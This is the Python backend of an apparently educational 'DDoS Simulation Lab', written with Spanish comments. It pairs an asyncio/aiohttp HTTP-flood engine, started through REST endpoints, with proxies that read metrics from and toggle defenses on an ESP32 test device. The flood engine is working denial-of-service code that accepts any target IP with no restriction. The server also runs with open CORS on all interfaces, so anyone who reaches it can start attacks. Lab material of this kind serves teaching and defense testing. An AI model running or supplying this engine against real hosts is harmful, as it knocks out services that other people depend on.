"""
======================================================
 🛡️ DDoS Simulation Lab — Backend Server
======================================================
 Motor de ataque async + proxy de métricas + API REST
 
 Stack: FastAPI + aiohttp + asyncio
 
 Ejecutar:
   pip install -r requirements.txt
   python server.py
   
 ⚠️ USO EXCLUSIVAMENTE EDUCATIVO — Solo en redes propias.
======================================================
"""

import asyncio
import time
from collections import deque
from contextlib import asynccontextmanager
from pathlib import Path

import aiohttp
from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel


# =============================================================
#  MOTOR DE ATAQUE
# =============================================================

class AttackEngine:
    """
    Motor de ataque DDoS controlado. Genera ráfagas de peticiones
    HTTP concurrentes contra un objetivo usando asyncio + aiohttp.
    """

    def __init__(self):
        self.is_running: bool = False
        self.target_ip: str = ""
        self.intensity: int = 100       # Peticiones por segundo deseadas
        self.concurrent: int = 50       # Conexiones concurrentes máximas
        self.attack_type: str = "http_flood"
        self.total_sent: int = 0
        self.total_success: int = 0
        self.total_failed: int = 0
        self.start_time: float = 0
        self.response_times: deque = deque(maxlen=200)
        self._task: asyncio.Task | None = None
        self._stop_event: asyncio.Event = asyncio.Event()

    # --- Propiedades calculadas ---

    @property
    def avg_response_time(self) -> float:
        if not self.response_times:
            return 0.0
        return sum(self.response_times) / len(self.response_times)

    @property
    def duration(self) -> float:
        if self.start_time == 0:
            return 0.0
        return time.time() - self.start_time

    @property
    def current_rps(self) -> float:
        d = self.duration
        if d <= 0:
            return 0.0
        return self.total_sent / d

    @property
    def success_rate(self) -> float:
        if self.total_sent == 0:
            return 0.0
        return (self.total_success / self.total_sent) * 100

    # --- Control del ataque ---

    def _reset_stats(self):
        self.total_sent = 0
        self.total_success = 0
        self.total_failed = 0
        self.start_time = time.time()
        self.response_times.clear()

    async def start(self, target_ip: str, intensity: int,
                    concurrent: int, attack_type: str):
        if self.is_running:
            raise ValueError("Ya hay un ataque en curso. Detenlo primero.")

        self.target_ip = target_ip
        self.intensity = max(1, intensity)
        self.concurrent = max(1, concurrent)
        self.attack_type = attack_type
        self.is_running = True
        self._stop_event.clear()
        self._reset_stats()

        self._task = asyncio.create_task(self._attack_loop())
        print(f"⚡ Ataque iniciado: {attack_type} → {target_ip} "
              f"({intensity} req/s, {concurrent} conc.)")

    async def stop(self):
        if not self.is_running:
            return

        self.is_running = False
        self._stop_event.set()

        if self._task:
            try:
                await asyncio.wait_for(self._task, timeout=5.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                self._task.cancel()
            self._task = None

        print(f"🛑 Ataque detenido. Enviadas: {self.total_sent} | "
              f"Éxito: {self.total_success} | Fallo: {self.total_failed}")

    # --- Lógica interna del ataque ---

    async def _single_request(self, session: aiohttp.ClientSession, url: str):
        """Envía una única petición HTTP y registra métricas."""
        try:
            start = time.time()
            async with session.get(
                url,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                await resp.read()  # Consumir respuesta completa
                elapsed_ms = (time.time() - start) * 1000
                self.response_times.append(elapsed_ms)
                self.total_success += 1
        except Exception:
            self.total_failed += 1
        finally:
            self.total_sent += 1

    async def _attack_loop(self):
        """Loop principal del ataque. Envía ráfagas controladas."""
        connector = aiohttp.TCPConnector(
            limit=self.concurrent,
            force_close=True,
            enable_cleanup_closed=True,
            ttl_dns_cache=300,
        )

        url = f"http://{self.target_ip}/"

        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                while self.is_running and not self._stop_event.is_set():
                    # Calcular tamaño del batch para este ciclo
                    batch_size = min(self.intensity, self.concurrent)

                    # Lanzar batch concurrente
                    tasks = [
                        self._single_request(session, url)
                        for _ in range(batch_size)
                    ]
                    await asyncio.gather(*tasks, return_exceptions=True)

                    # Throttle: esperar para mantener la tasa deseada
                    delay = batch_size / max(self.intensity, 1)
                    try:
                        await asyncio.wait_for(
                            self._stop_event.wait(),
                            timeout=max(0.01, delay)
                        )
                        break  # Se pidió detener
                    except asyncio.TimeoutError:
                        pass  # Continuar con el siguiente batch

        except Exception as e:
            print(f"❌ Error en el loop de ataque: {e}")
        finally:
            self.is_running = False

    # --- Serialización ---

    def to_dict(self) -> dict:
        return {
            "is_running": self.is_running,
            "target_ip": self.target_ip,
            "intensity": self.intensity,
            "concurrent": self.concurrent,
            "attack_type": self.attack_type,
            "total_sent": self.total_sent,
            "total_success": self.total_success,
            "total_failed": self.total_failed,
            "avg_response_ms": round(self.avg_response_time, 2),
            "current_rps": round(self.current_rps, 1),
            "duration_s": round(self.duration, 1),
            "success_rate": round(self.success_rate, 1),
        }


# =============================================================
#  APLICACIÓN FASTAPI
# =============================================================

engine = AttackEngine()


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Limpieza al cerrar el servidor."""
    yield
    await engine.stop()


app = FastAPI(
    title="DDoS Simulation Lab",
    description="Backend para simulación educativa de ataques DDoS",
    version="1.0.0",
    lifespan=lifespan,
)

# CORS abierto (entorno de laboratorio)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# =============================================================
#  MODELOS
# =============================================================

class AttackConfig(BaseModel):
    target_ip: str
    intensity: int = 100
    concurrent: int = 50
    attack_type: str = "http_flood"


# =============================================================
#  ENDPOINTS — CONTROL DE ATAQUE
# =============================================================

@app.post("/api/attack/start")
async def start_attack(config: AttackConfig):
    """Inicia un ataque con la configuración proporcionada."""
    try:
        await engine.start(
            target_ip=config.target_ip,
            intensity=config.intensity,
            concurrent=config.concurrent,
            attack_type=config.attack_type,
        )
        return {"status": "started", "config": config.model_dump()}
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/api/attack/stop")
async def stop_attack():
    """Detiene el ataque en curso."""
    await engine.stop()
    return {"status": "stopped", **engine.to_dict()}


@app.get("/api/attack/status")
async def attack_status():
    """Consulta el estado actual del motor de ataque."""
    return engine.to_dict()


# =============================================================
#  ENDPOINTS — MÉTRICAS (PROXY AL ESP32)
# =============================================================

@app.get("/api/metrics")
async def get_metrics(target_ip: str = Query(default="")):
    """
    Obtiene métricas combinadas: telemetría del ESP32 + stats del ataque.
    Si el ESP32 no es alcanzable, retorna solo las stats del ataque.
    """
    ip = target_ip or engine.target_ip
    attack_data = engine.to_dict()

    if not ip:
        return {
            "esp32": None,
            "attack": attack_data,
            "connected": False,
        }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"http://{ip}/metrics",
                timeout=aiohttp.ClientTimeout(total=3),
            ) as resp:
                esp32_data = await resp.json()
                return {
                    "esp32": esp32_data,
                    "attack": attack_data,
                    "connected": True,
                }
    except Exception:
        return {
            "esp32": None,
            "attack": attack_data,
            "connected": False,
        }


# =============================================================
#  ENDPOINTS — CONTROL DE DEFENSAS (PROXY AL ESP32)
# =============================================================

@app.post("/api/defense/toggle")
async def toggle_defense(target_ip: str = Query(default="")):
    """Activa/desactiva las defensas en el ESP32."""
    ip = target_ip or engine.target_ip
    if not ip:
        raise HTTPException(status_code=400, detail="No se especificó IP del ESP32")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"http://{ip}/defense/toggle",
                timeout=aiohttp.ClientTimeout(total=3),
            ) as resp:
                return await resp.json()
    except Exception as e:
        raise HTTPException(
            status_code=502,
            detail=f"ESP32 no alcanzable: {e}",
        )


@app.post("/api/defense/ratelimit")
async def set_ratelimit(
    target_ip: str = Query(default=""),
    value: int = Query(default=10),
):
    """Ajusta el rate limit en el ESP32."""
    ip = target_ip or engine.target_ip
    if not ip:
        raise HTTPException(status_code=400, detail="No se especificó IP del ESP32")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"http://{ip}/defense/ratelimit",
                data={"value": str(value)},
                timeout=aiohttp.ClientTimeout(total=3),
            ) as resp:
                return await resp.json()
    except Exception as e:
        raise HTTPException(
            status_code=502,
            detail=f"ESP32 no alcanzable: {e}",
        )


# =============================================================
#  ENDPOINTS — ESTADO DE CONEXIÓN
# =============================================================

@app.get("/api/esp32/status")
async def esp32_status(target_ip: str = Query(default="")):
    """Verifica si el ESP32 es alcanzable."""
    ip = target_ip or engine.target_ip
    if not ip:
        return {"reachable": False, "ip": ""}

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"http://{ip}/metrics",
                timeout=aiohttp.ClientTimeout(total=2),
            ) as resp:
                if resp.status == 200:
                    return {"reachable": True, "ip": ip}
    except Exception:
        pass

    return {"reachable": False, "ip": ip}


# =============================================================
#  SERVIR DASHBOARD (ARCHIVOS ESTÁTICOS)
# =============================================================

dashboard_dir = Path(__file__).parent.parent / "dashboard"
if dashboard_dir.exists():
    app.mount(
        "/",
        StaticFiles(directory=str(dashboard_dir), html=True),
        name="dashboard",
    )
    print(f"📂 Dashboard servido desde: {dashboard_dir}")


# =============================================================
#  PUNTO DE ENTRADA
# =============================================================

if __name__ == "__main__":
    import uvicorn

    print()
    print("=================================")
    print(" 🛡️ DDoS Simulation Lab — Backend")
    print("=================================")
    print()

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=9090,
        log_level="info",
    )
